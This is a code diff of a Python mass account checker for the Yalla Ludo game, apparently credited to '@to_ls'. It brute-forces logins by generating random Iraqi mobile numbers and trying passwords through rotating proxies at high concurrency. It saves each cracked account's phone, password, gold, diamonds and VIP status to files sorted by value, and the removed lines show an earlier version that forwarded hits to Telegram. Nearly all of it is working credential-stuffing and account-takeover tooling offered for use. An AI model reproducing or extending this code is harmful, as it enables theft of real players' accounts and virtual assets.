-            pwd_md5 = hashlib.md5(pwd.encode()).hexdigest().upper()
-            
             try:
-                result = await login_account(session, mobile, pwd_md5, AREA_CODE, proxy)
+                result = await login_account(session, mobile, pwd, 964, proxy)
                 
                 if result.get("success"):
                     data = result.get("data", {})
                     name = data.get("name", data.get("nickName", ""))
                     uid = result.get("user_id", "")
-                    token = result.get("token", "")
                     
                     if not name or name == "" or name == "Unknown" or name == " ":
                         with stats_lock:
@@ -651,18 +482,6 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                             'reason': 'EMPTY_NAME'
                         }
                         verify_accounts.append(verify_account)
-                        save_account_to_file(verify_account, "verification_accounts.txt")
-                        
-                        if RICH_AVAILABLE:
-                            console.print(f"\n[yellow][!][/yellow] VERIFICATION NEEDED: [bold]{mobile}[/bold] | {pwd}")
-                            console.print(f"    Name: [red]EMPTY[/red] - Account needs verification")
-                            console.print(f"    [dim]Saved to verification_accounts.txt[/dim]")
-                        else:
-                            print(f"\n[!] VERIFICATION NEEDED: {mobile} | {pwd}")
-                            print(f"    Name: EMPTY - Account needs verification")
-                            print(f"    Saved to verification_accounts.txt")
-                        
-                        await send_telegram_verify_async(session, mobile, pwd, name, uid, "EMPTY_NAME")
                         return
                     
                     gold = 0
@@ -690,36 +509,11 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                         if vip_info:
                             vip_type = vip_info.get("vipType", "")
                             vip_end_time = vip_info.get("vipEndTime", 0)
-                            if not vip_type and is_vip:
-                                vip_type = "VIP"
                     
                     if gold == 0 and diamond == 0 and level == 0:
                         with stats_lock:
                             stats['verification_needed'] += 1
                             stats['total'] += 1
-                        
-                        verify_account = {
-                            'phone': mobile,
-                            'password': pwd,
-                            'name': name,
-                            'uid': uid,
-                            'reason': 'EMPTY_ACCOUNT'
-                        }
-                        verify_accounts.append(verify_account)
-                        save_account_to_file(verify_account, "verification_accounts.txt")
-                        
-                        if RICH_AVAILABLE:
-                            console.print(f"\n[yellow][!][/yellow] VERIFICATION NEEDED: [bold]{mobile}[/bold] | {pwd}")
-                            console.print(f"    Name: {name}")
-                            console.print(f"    Gold: [red]0[/red] - Account needs verification")
-                            console.print(f"    [dim]Saved to verification_accounts.txt[/dim]")
-                        else:
-                            print(f"\n[!] VERIFICATION NEEDED: {mobile} | {pwd}")
-                            print(f"    Name: {name}")
-                            print(f"    Gold: 0 - Account needs verification")
-                            print(f"    Saved to verification_accounts.txt")
-                        
-                        await send_telegram_verify_async(session, mobile, pwd, name, uid, "EMPTY_ACCOUNT")
                         return
                     
                     account_data = {
@@ -781,94 +575,35 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                         
                         if is_vip:
                             vip_stats["VIP"] += 1
-                            if vip_type:
-                                vip_stats[f"VIP_{vip_type}"] += 1
                         else:
                             vip_stats["Non-VIP"] += 1
                         
                         found_accounts.append(account_data)
                     
-                    saved_file = save_account_by_gold(account_data)
-                    save_account_full_by_gold(account_data)
+                    # حفظ الحسابات
+                    save_account(account_data)
                     
-                    if RICH_AVAILABLE:
-                        console.print(f"\n[green][+][/green] GOOD: [bold green]{mobile}[/bold green] | [bold yellow]{pwd}[/bold yellow]")
-                        console.print(f"    Name: {name}")
-                        console.print(f"    ID: {uid}")
-                        console.print(f"    Gold: [green]{gold:,}[/green]")
-                        console.print(f"    Diamond: [green]{diamond:,}[/green]")
-                        console.print(f"    Level: [green]{level}[/green]")
-                        if exp > 0:
-                            console.print(f"    XP: [green]{exp:,} / {max_exp:,}[/green]")
-                        if royal > 0:
-                            console.print(f"    Royal: [green]{royal}[/green]")
-                        if is_vip:
-                            vip_text = f"✅ Yes"
-                            if vip_type:
-                                vip_text += f" ({vip_type})"
-                            if vip_end_time:
-                                try:
-                                    end_date = datetime.fromtimestamp(vip_end_time/1000).strftime('%Y-%m-%d %H:%M')
-                                    vip_text += f" until {end_date}"
-                                except:
-                                    pass
-                            console.print(f"    VIP: [green]{vip_text}[/green]")
-                        else:
-                            console.print(f"    VIP: [red]No[/red]")
-                        if proxy:
-                            proxy_clean = proxy.split('@')[-1] if '@' in proxy else proxy
-                            console.print(f"    Proxy: [dim]{proxy_clean}[/dim]")
-                        console.print(f"    [dim]Saved to {saved_file}[/dim]")
-                    else:
-                        print(f"\n[+] GOOD: {mobile} | {pwd}")
-                        print(f"    Name: {name}")
-                        print(f"    ID: {uid}")
-                        print(f"    Gold: {gold:,}")
-                        print(f"    Diamond: {diamond:,}")
-                        print(f"    Level: {level}")
-                        if exp > 0:
-                            print(f"    XP: {exp:,} / {max_exp:,}")
-                        if royal > 0:
-                            print(f"    Royal: {royal}")
-                        if is_vip:
-                            vip_text = f"Yes"
-                            if vip_type:
-                                vip_text += f" ({vip_type})"
-                            if vip_end_time:
-                                try:
-                                    end_date = datetime.fromtimestamp(vip_end_time/1000).strftime('%Y-%m-%d %H:%M')
-                                    vip_text += f" until {end_date}"
-                                except:
-                                    pass
-                            print(f"    VIP: {vip_text}")
-                        else:
-                            print(f"    VIP: No")
-                        if proxy:
-                            proxy_clean = proxy.split('@')[-1] if '@' in proxy else proxy
-                            print(f"    Proxy: {proxy_clean}")
-                        print(f"    Saved to {saved_file}")
+                    # تسجيل البروكسي كشغال
+                    if proxy:
+                        proxy_manager.mark_working(proxy)
                     
-                    if RICH_AVAILABLE:
-                        console.print("[yellow][!][/yellow] Sending to Telegram...")
-                    
-                    await send_telegram_async(session, mobile, pwd, name, uid, gold, diamond, level, exp, max_exp, royal, is_vip, vip_type, vip_end_time)
                     return
                     
                 else:
                     status = result.get("status", -1)
-                    tips = result.get("tips", "")
-                    
-                    if status == 151 or ("كلمة السر" in tips and "خاطئة" in tips):
+                    if status == 151 or status == 182:
                         continue
                     else:
                         with stats_lock:
                             stats['not_registered'] += 1
                             stats['total'] += 1
-                        return                        
+                        return
+                        
             except Exception as e:
                 with stats_lock:
                     stats['error'] += 1
                     stats['total'] += 1
+                # تسجيل البروكسي كفاشل
                 if proxy:
                     proxy_manager.mark_failed(proxy)
                 continue
@@ -876,6 +611,35 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
         with stats_lock:
             stats['wrong_pass'] += 1
             stats['total'] += 1
+
+def save_account(account):
+    try:
+        gold = account.get('gold', 0)
+        phone = account['phone']
+        password = account['password']
+        
+        # حفظ حسب الذهب
+        if gold < 1000000:
+            filename = "gold_0_1M.txt"
+        elif gold < 5000000:
+            filename = "gold_1M_5M.txt"
+        elif gold < 10000000:
+            filename = "gold_5M_10M.txt"
+        elif gold < 50000000:
+            filename = "gold_10M_50M.txt"
+        elif gold < 100000000:
+            filename = "gold_50M_100M.txt"
+        else:
+            filename = "gold_100M_plus.txt"
+        
+        with open(filename, 'a', encoding='utf-8') as f:
+            f.write(f"{phone}:{password}\n")
+        
+        with open("good_accounts_full.txt", 'a', encoding='utf-8') as f:
+            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
+            f.write(f"Phone: {phone} | Pass: {password} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
+    except:
+        pass
 
 # ============================================================
 # DASHBOARD
@@ -896,7 +660,10 @@ def create_dashboard():
         vip_count = vip_stats.get('VIP', 0)
         non_vip_count = vip_stats.get('Non-VIP', 0)
     
+    proxy_stats = proxy_manager.get_stats() if proxy_manager else {"total": 0, "working": 0, "failed": 0}
+    
     if RICH_AVAILABLE:
+        # جدول الإحصائيات
         stats_table = Table(show_header=False, box=box.ROUNDED, border_style="bright_blue")
         stats_table.add_column("", style="cyan", width=15)
         stats_table.add_column("", style="green", justify="right")
@@ -910,6 +677,7 @@ def create_dashboard():
         stats_table.add_row("VIP", f"[magenta]{vip_count}[/magenta]")
         stats_table.add_row("Non-VIP", f"[white]{non_vip_count}[/white]")
         
+        # جدول الذهب
         gold_table = Table(show_header=False, box=box.MINIMAL)
         gold_table.add_column("", style="yellow")
         gold_table.add_column("", style="green", justify="right")
@@ -920,6 +688,7 @@ def create_dashboard():
         gold_table.add_row("50M-99M", str(gold_stats.get('50M-99M', 0)))
         gold_table.add_row("100M+", str(gold_stats.get('100M+', 0)))
         
+        # جدول الجواهر
         diamond_table = Table(show_header=False, box=box.MINIMAL)
         diamond_table.add_column("", style="cyan")
         diamond_table.add_column("", style="green", justify="right")
@@ -930,6 +699,7 @@ def create_dashboard():
         diamond_table.add_row("500K-999K", str(diamond_stats.get('500K-999K', 0)))
         diamond_table.add_row("1M+", str(diamond_stats.get('1M+', 0)))
         
+        # جدول المستويات
         level_table = Table(show_header=False, box=box.MINIMAL)
         level_table.add_column("", style="magenta")
         level_table.add_column("", style="green", justify="right")
@@ -939,6 +709,7 @@ def create_dashboard():
         level_table.add_row("Level 30-39", str(level_stats.get('Level 30-39', 0)))
         level_table.add_row("Level 40+", str(level_stats.get('Level 40+', 0)))
         
+        # آخر الحسابات
         last_found_text = ""
         for acc in found_accounts[-5:]:
             vip_status = "✅VIP" if acc['is_vip'] else "❌"
@@ -948,11 +719,11 @@ def create_dashboard():
         
         layout = Layout()
         layout.split_column(
-            Layout(Panel(Text("YALLA LUDO MASS CHECKER - Iraq (+964)", style="bold bright_blue"), box=box.HEAVY)),
+            Layout(Panel(Text("YALLA LUDO CHECKER - Iraq Only", style="bold bright_blue"), box=box.HEAVY)),
             Layout(Panel(stats_table, title="[bold]Statistics", border_style="blue")),
             Layout(name="middle"),
             Layout(Panel(last_found_text, title="[bold green]Last Found Accounts", border_style="green")),
-            Layout(Panel(f"By @to_ls | Proxies: [green]{len(proxy_manager.proxies) if proxy_manager else 0}[/green] (Working: [green]{len(proxy_manager.working_proxies) if proxy_manager else 0}[/green])", style="dim"))
+            Layout(Panel(f"By @to_ls | Proxies: [green]{proxy_stats['total']}[/green] (Working: [green]{proxy_stats['working']}[/green])", style="dim"))
         )
         
         layout["middle"].split_row(
@@ -965,13 +736,16 @@ def create_dashboard():
     else:
         output = f"""
 ============================================================
-              YALLA LUDO MASS CHECKER
-              Iraq (+964) - 77xxxxxxxx
+                 YALLA LUDO CHECKER
+              Iraq Only - 77xxxxxxxx
                 By @to_ls
 ============================================================
 
+------------------------------------------------------------
+
   Elapsed    : {hours:02d}:{minutes:02d}:{seconds:02d}
   Checked    : {total}
+
   Hits       : {good}
   Bads       : {wrong + notreg}
   Verify     : {verification}
@@ -979,9 +753,48 @@ def create_dashboard():
   VIP        : {vip_count}
   Non-VIP    : {non_vip_count}
 
-  GOLD: 0-999K:{gold_stats.get('0-999K',0)} 1M-4.9M:{gold_stats.get('1M-4.9M',0)} 5M-9.9M:{gold_stats.get('5M-9.9M',0)} 10M-49M:{gold_stats.get('10M-49M',0)} 50M-99M:{gold_stats.get('50M-99M',0)} 100M+:{gold_stats.get('100M+',0)}
-  
-  Proxies: {len(proxy_manager.proxies) if proxy_manager else 0} (Working: {len(proxy_manager.working_proxies) if proxy_manager else 0})
+------------------------------------------------------------
+
+  GOLD CATEGORIES:
+    0-999K    : {gold_stats.get('0-999K', 0)}
+    1M-4.9M   : {gold_stats.get('1M-4.9M', 0)}
+    5M-9.9M   : {gold_stats.get('5M-9.9M', 0)}
+    10M-49M   : {gold_stats.get('10M-49M', 0)}
+    50M-99M   : {gold_stats.get('50M-99M', 0)}
+    100M+     : {gold_stats.get('100M+', 0)}
+
+------------------------------------------------------------
+
+  DIAMOND CATEGORIES:
+    0-9.9K    : {diamond_stats.get('0-9.9K', 0)}
+    10K-49K   : {diamond_stats.get('10K-49K', 0)}
+    50K-99K   : {diamond_stats.get('50K-99K', 0)}
+    100K-499K : {diamond_stats.get('100K-499K', 0)}
+    500K-999K : {diamond_stats.get('500K-999K', 0)}
+    1M+       : {diamond_stats.get('1M+', 0)}
+
+------------------------------------------------------------
+
+  LEVEL CATEGORIES:
+    Level 0-9   : {level_stats.get('Level 0-9', 0)}
+    Level 10-19 : {level_stats.get('Level 10-19', 0)}
+    Level 20-29 : {level_stats.get('Level 20-29', 0)}
+    Level 30-39 : {level_stats.get('Level 30-39', 0)}
+    Level 40+   : {level_stats.get('Level 40+', 0)}
+
+------------------------------------------------------------
+
+  LAST FOUND ACCOUNTS:
+"""
+        for acc in found_accounts[-5:]:
+            vip_status = "VIP" if acc['is_vip'] else "Non-VIP"
+            output += f"    {acc['phone']} | Pass: {acc['password']} | Gold:{acc['gold']} | Diamond:{acc['diamond']} | Lv:{acc['level']} | {vip_status}\n"
+        if not found_accounts:
+            output += "    No accounts found yet...\n"
+        
+        output += f"""
+------------------------------------------------------------
+  By @to_ls | Proxies: {proxy_stats['total']} (Working: {proxy_stats['working']})
 """
         return output
 
@@ -998,48 +811,27 @@ def dashboard_loop():
             time.sleep(1)
 
 # ============================================================
-# MASS CHECKER MAIN
+# MAIN
 # ============================================================
-async def mass_checker():
-    global stop_flag, BOT_TOKEN, CHAT_IDS, proxy_manager
+async def main_async():
+    global stop_flag
     
     if RICH_AVAILABLE:
-        console.print(Panel("Yalla Ludo - Mass Checker - Iraq (+964)\nWith Residential Proxies Support\nBy @to_ls", style="bold blue", box=box.HEAVY))
+        console.print(Panel("Yalla Ludo - Fast Checker - Iraq Only\nWith Residential Proxies Support\nBy @to_ls", style="bold blue", box=box.HEAVY))
     else:
         print("""
 ============================================================
-     Yalla Ludo - Mass Checker - Iraq (+964)
+     Yalla Ludo - Fast Checker - Iraq Only
      Speed + Full Account Info
      With Residential Proxies Support
      By @to_ls
 ============================================================
         """)
     
-    print("\n[+] Enter Configuration:")
-    
-    proxy_path = input("Proxy file path (press Enter to skip): ").strip()
-    if proxy_path:
-        proxy_manager = ProxyManager(proxy_path)
-    else:
-        proxy_manager = ProxyManager()
-        print("[!] Running without proxies")
-    
-    BOT_TOKEN = input("Telegram Bot Token (press Enter to skip): ").strip()
-    
-    if BOT_TOKEN:
-        chat_ids_input = input("Telegram Chat IDs (comma separated, e.g., 123,456): ").strip()
-        if chat_ids_input:
-            CHAT_IDS = [x.strip() for x in chat_ids_input.split(',') if x.strip()]
-            print(f"[+] Will send to {len(CHAT_IDS)} recipients")
-        else:
-            print("[!] No chat IDs provided, Telegram disabled")
-            BOT_TOKEN = ""
-    else:
-        print("[!] No bot token provided, Telegram disabled")
-    
-    print("\n[+] Starting mass checker...\n")
-    
-    concurrency = 300
+    # ============================================================
+    # عدد الـ Threads = 1000
+    # ============================================================
+    concurrency = 100
     semaphore = asyncio.Semaphore(concurrency)
     
     threading.Thread(target=dashboard_loop, daemon=True).start()
@@ -1047,28 +839,34 @@ async def mass_checker():
     connector = aiohttp.TCPConnector(
         limit=concurrency*2,
         limit_per_host=concurrency,
-        force_close=False
+        force_close=False,
+        enable_cleanup_closed=True
     )
     
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = []
         while not stop_flag:
             mobile = generate_mobile_iq()
-            proxy = proxy_manager.get_proxy() if proxy_manager else None
+            proxy = proxy_manager.get_proxy() if proxy_manager.use_proxies else None
             task = asyncio.create_task(check_number_async(session, mobile, semaphore, proxy))
             tasks.append(task)
             
-            if len(tasks) > 2000:
-                done, pending = await asyncio.wait(tasks[:500], return_when=asyncio.FIRST_COMPLETED)
-                tasks = list(pending) + tasks[500:]
+            # الحفاظ على عدد المهام
+            if len(tasks) > 5000:
+                done, pending = await asyncio.wait(tasks[:1000], return_when=asyncio.FIRST_COMPLETED)
+                tasks = list(pending) + tasks[1000:]
         
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
 
-def main():
+def run():
+    asyncio.run(main_async())
+
+if __name__ == "__main__":
     try:
-        asyncio.run(mass_checker())
+        run()
     except KeyboardInterrupt:
+        stop_flag = True
         if RICH_AVAILABLE:
             console.print("\n[yellow][!][/yellow] Stopped.")
             console.print("\n[bold green]Final Report:[/bold green]")
@@ -1115,6 +913,3 @@ def main():
                 for cat, count in sorted(level_stats.items()):
                     print(f"      - {cat}: {count}")
             print("\nBy @to_ls")
-
-if __name__ == "__main__":
-    main()
